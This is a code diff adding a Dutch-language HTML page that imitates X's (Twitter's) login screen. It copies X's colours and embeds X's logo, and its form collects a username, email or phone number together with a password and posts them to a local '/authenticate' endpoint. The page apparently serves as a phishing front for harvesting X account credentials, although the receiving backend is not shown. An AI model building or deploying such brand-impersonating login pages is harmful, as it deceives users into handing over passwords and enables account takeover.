@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Inloggen bij X</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #000; /* Zwarte achtergrond zoals X */
+      color: white;
+    }
+
+    .container {
+      text-align: center;
+      background-color: #1c1e21; /* Donkergrijs voor contrast */
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    /* X-logo als Base64-afbeelding */
+    .logo {
+      width: 100px;  /* Pas de breedte aan naar wens */
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: white;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 14px;
+      border: 1px solid #2f3336;
+      border-radius: 6px;
+      background-color: #2f3336; /* Donkergrijze invoervelden */
+      color: white;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #1da1f2; /* Blauwe rand als focus */
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #1da1f2; /* Twitter blauw */
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #1991db; /* Donkerder blauw bij hover */
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- X-logo als afbeelding -->
+    <img class="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAACWCAYAAAA8AXHiAAAACXBIWXMAAAsTAAALEwEAmpwYAAAKuElEQVR4nO2decxeRRWHh7Jq0Qql1EIrUpUIVCugYg3FqNEEjAoIGrRxQf8EpLRQo0KRNLTg2lIkCGoMqwhd4hLRKNQQTQouSMGFaFDBhVZDRbF8pX3M2KkWe+fMvO+9s9z3O8+/zb3nvGd+/e5s5xxjFEVRFEVRFEVRFEVRFEVRFEVRFEVREgLsC7wOuARYBTwA/A0YQ+map1xsH3CxtjE/EdhnZEQOvAK42v1QpSx2DD4PzDZ9BXgZ8A1ge+FgKrtjx+TrwCzTs0/eJ4GtDT9IqQs7DbnCjpmpGeBFwI9LR0sZmHuBmaZGgOOAvwz+m5RK+DNwrKkJ6xCwOcL5p4E7gfOA44GDgb1L+z9qAHu72NoYz3cxt7EPsbkacbnPX+gv1T+AJcDk0v6OV4DJbgz+GfGX6/AaJuqhOdWNwLSijir/BTgEuCkwZvcUndC71Z8P+6d3QTHnFBFgYeDzuMwU3KfybSlYh08t4pgSDXCaIC67FXG0yY3b/PShf6l6AnChMI5rczszW9hRvzGrM0prgFs8Y2nH+OU5HbFnf008CUzP5ojS5YTet1q8KudK0HegvCSLE0rnAJd5xnRTlr1Gd/WlCTuR132qngJMESbyc3M4YO/2NHFncuNKUoB1nrFdnMP4ao/x85IbV5ICnO8Z21U5jD/oMX58cuNKUoA5nrHdkMO4ncw1MSW5cSUpwFTP2G7MYdzep25idO5Tj1PYseJvYksO440kN6xkodj4qrBGG1RYSgpUWEoSVFhKElRYShLGhbCAD5GWs01FAAcCvxL8XZHBh0bMqBkGbiUd/7I3YU09mTXfE3z9FrBXBj8aGUVhHQT8kXT8pPTmLrAH8BXBxw3ApEy+NDKShoE3J64BsTSl/yGAiwTf7H+qF5hM+JwYWcPAlaRjG/D61L+hCeAM4T+NvZH7apMRX4BG1jCwH/Bz0vEH4IDUv2NXgFcJV4Kt2E8xmfEFZ3QN77B9jHAIbrOtj4iYy9jyPT6uz/E7LDbbOJBBfr4pwLgUlrO/KJDBK97PdjUNbBq5jzMz/IbnAvcLPlyX2gfBt3ErrAnA94VBuSTiHScJ85rHgcMSbyt8V/D/jhzbCoJ/41NYzofpQqaQTeqYE/GOa4TB/QGwZ+bUOVzN0OelsDuAf42MruHd/XiPzxfgt/ZzE3j+2cAvhXdckPkzvtFW7una5hA+jm9hOV9sJRsfX4osFudbDGyxhXk79PUdbqXnOwF4jakAFdaOIEwCHhbE9c6IQH4s8Gl6VgeDdZxbtTaxPceCIRYV1v8CMVdItLTzsBkRi4G7BHF9ruVAHQo8Irx/kakIFdYzg3G5MHB2BTYhEMwZwmLA/kU5echBeg5wX5vPdW5UWLsv4dcLAzg/IqDvFZ63G5kHDzhAewY2Y9fVmNmkwto9IEe6szXfRDzYjQG4WRDC6gEHaKXwrl/kPj6KRYXVHJRz2kzE7R4S8DvhHWe1TFXHJfy+2FQKHkbXcATuLFCqNPiZlosBu7J7SeD5k4Xn7bbCa03FqLCGOwu0E/GTWhbtXe87j3SH5E8ItueZylFhycF5uyCMR0N1vFyq+U+Fd1zsqYr3e+GZi0wPUGGFA3SdMMjBsjzAUcJiYOuuO+XA/gEh3mw/06YHqLDCAZoYyHj5QMQ7zhWe/43bp7IbrGsCB9r7mp6gwooL0iuFDq4xE/HQYuALwPKA+KaYHqHCal/aUpyID3Ax0MdfQzdaa0SFFR+ovYAfDjIRH3Ax0MQY8AbTQ1RYgwVrJvD3mIm48I5rI0W13R4PmZ6iwuo2Xf8/E/GWi4GdXGp6jApruKCtapPAYHP8Ar2ub+vLtoIPFVaadP0zWmYtF0/Xb4sKa/jAvUnI0LH3zg9peTFwmekxKqx2wVshCOM7oc+ZSzbdXFu6fheosNKm658b8Y7315Su3xUqrLTp+lti+vQJff4sN5gegofRNZy/u6itSbVfy4uBZ5qeocLqJogTAlX0PhXZZm9biXT9FKiwuk3Xt+d6TVjBvDHiHZ8uka6fAhVWt8E8XRDGI5EXA38mvONC0xNUWHnT9W9veTFwzBZZMz1AhdV9QEM3GN4X8Y4Pp07XT40Kq9tgvlTIhN7JE6G0LXcx8JvCO5abylFhdRfIycCviePu0ETcJVVs9Dxvj5LeYipGhdVNEPexTdIZjI9HvPeUQLr+VFMpKqz2AbSfresZnK0x/a+BLwrvWGMqRYXVPoCfEAbe5gdeKvy7/XRODLx/f+Ah4R0fNBWiwmoXvHcJV2fsJH12RIbONR1kCR1hKkOFNXzgTnCHzE3YmgtvGyBD5/SWWUL3hLKEcqPCGj6p4jFhoM8ZcH/Lrv6mtcwSWmwqQoXVfS/A5UNm6NwRcTFwpnAxMKp8eC5UWBl7AUZk6AQbagJntckSyoUKK3MvQFf5eKxNQ03gq4If15oKUGF11wtwxgDvWtwmQwc4IFDqKJgllBoVVoFegBET8cs7yBKaZgqiwirUCzCQrr8tpmYD8Nk2i4GUqLDk4LwwZS9Au2seuBh4YMTFwPsG2fbIhQqrcC9A4FbBxm0Rzx8tXAyMWgykQIU1XC/Ab3fVCzAiXX9ey7LdRdL1VVgV9AIMTMQft5/kiK0Qu4dWTbq+Cmv3gHykRC/AQKnIuyMvBtqmAlWk66uw4nsBPpmyF6CbiEvp+h+NeMepgXR9cTHQJSqsinoBArPchLvNxcAvC+L6WurfsIsfjYyu4WZfDgtca1lUSbr+Q/biX+D5iYG79+/O9DvGt7Bq6wUYka5/deSm7ljJdP1xLaxaewEG0vUtb215ZTp5ur7PcEqbZQ0/04erau0FGEjXfwx4fsR55I9KpeuPW2EBC2rvBQjcENik3aPFeWTSdP1xKSyb7NmHXoDAJOBh0vFgqnR9n8EUtqowDBwb2FaYV2HSxtOkY0UivxtJYau4Ybc7bTcKh85OLgGwjHQkSdf3GevaTnHDfe4FyI5DcdsIKhWdp+v7DHVpo7hht62wts+9AIEjhesxXdBpur7PSJc2ihsO1GPvTS9A4GzS0lm6vs9AV++vz7CSBRWWkgQVlpIEFZaSBBWWkgQVljJywvI1Nup1A0jF7Lxm3cSW5PERLv73Yk9J8WN38T1ju9Gkxp2sN5EsYUHJg70d4hnbDTmMr/YYn5/cuJIUYOGwLV+6MO4r5XNXcuNKUtzZaxMX5zB+opDmdFByB5Qk2DmycH/shFzdHHwJA0uSO6AkAVjqGdNN2So7CzUS7PWQ6VmcUDoDOFSoJbYypyOzhWIYN2VzROkEoTbq9pim650SyOtbmNUZZWhstrgwjqtLODRLyNq1k8DTsjuldFlMxZ6wHGVKAFwhqN2K64IijimxtSZ8orIsNYXPlu5F5hY7OSzmpNI0UZfqzeMSQMqe/bqsXaniC27FcZmeJxbfp1oakdjxp1Alwmy4ZFJfr5j//zyuc2nyc9yhp96KSLPXONXFeIGLeUzyrB3DY0xN2Cq/wKMRzit1Yr86x5oaAQ53PfiUfrG+ms9fYEK/TNiKUOphzM27+jMdcQXy1wo79Eo57JisKbZP1QX2SMAVSpMq3Sl5sAfKK7Mf02QokDHX3ee63bUl2STcoVeG5ykX2/tdrBe7skpV9Z9WFEVRFEVRFEVRFEVRFEVRFEVRFMWMHP8G4BOlNfl3b4sAAAAASUVORK5CYII=" alt="X-logo">
+
+    <h2>Log in om verder te gaan</h2>
+    <form action="/authenticate" method="POST">
+      <input type="text" name="username" placeholder="E-mailadres, telefoon of gebruikersnaam" required>
+      <input type="password" name="password" placeholder="Wachtwoord" required>
+      <button type="submit">Inloggen</button>
+    </form>
+  </div>
+
+</body>
+</html>
